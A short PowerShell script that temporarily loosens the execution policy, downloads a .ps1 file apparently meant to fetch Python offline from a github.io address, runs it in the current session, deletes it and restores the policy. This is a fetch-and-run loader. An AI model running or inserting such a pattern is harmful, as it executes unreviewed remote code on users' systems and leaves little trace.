$currentPolicy = Get-ExecutionPolicy
Set-ExecutionPolicy RemoteSigned -Scope Process -Force
$tempPath = [System.IO.Path]::GetTempPath()
$scriptUrl = "https://iiirrkimo.github.io/checkdata/downloadpyoffline.ps1"
$scriptPath = "$tempPath\downloadpyoffline.ps1"
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
. $scriptPath
Remove-Item $scriptPath -Force
Set-ExecutionPolicy $currentPolicy -Scope Process -Force
